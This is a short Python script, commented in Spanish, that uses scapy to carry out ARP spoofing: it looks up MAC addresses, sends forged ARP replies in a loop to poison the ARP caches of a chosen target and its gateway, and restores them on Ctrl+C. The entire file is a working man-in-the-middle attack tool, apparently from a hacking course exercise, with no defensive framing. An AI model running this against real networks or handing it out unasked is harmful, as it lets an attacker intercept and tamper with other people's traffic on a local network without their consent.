import scapy.all as scapy
import argparse
import time
import sys

def get_arguments():#usamos arguments para poder recibir lineas de comandos 
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target", help="especifique la ip objetivo")
    parser.add_argument("-g", "--gateway", dest="gateway", help="especifique la ip del gateway")
    return parser.parse_args()

def get_mac(ip):#el get mac es para optener la direccio mac de una ip
    arp_packet = scapy.ARP(pdst=ip)
    broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_broadcast_packet = broadcast_packet/arp_packet
    answered_list = scapy.srp(arp_broadcast_packet, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc

def restore(destination_ip, source_ip):#con esta funcion hacemos la restauracion de las tablas arp del objetivo y su puerta de enlace
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, 4)

def spoof(target_ip, spoof_ip):#definimos la funcion spoof para envenenar la tabla arp del objetivo
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


arguments = get_arguments()
sent_packets = 0
try:
    while True:#necesitamos seguir enviando paquetes arp, por lo tanto el bucle infinito 
        #aqui se recibe y manda los paguetes para poder hacer el envenamiento a la tabla arp del objetivo
        spoof(arguments.target, arguments.gateway)
        spoof(arguments.gateway, arguments.target)
        sent_packets+=2
        print("\r[+] enviando paquetes: " + str(sent_packets)),
        sys.stdout.flush()
        time.sleep(2)

except KeyboardInterrupt:
    print("\n[-] Ctrl + C detectado.....restaurando tablas arp espere por favor!")
    restore(arguments.target,arguments.gateway)
    restore(arguments.gateway, arguments.target)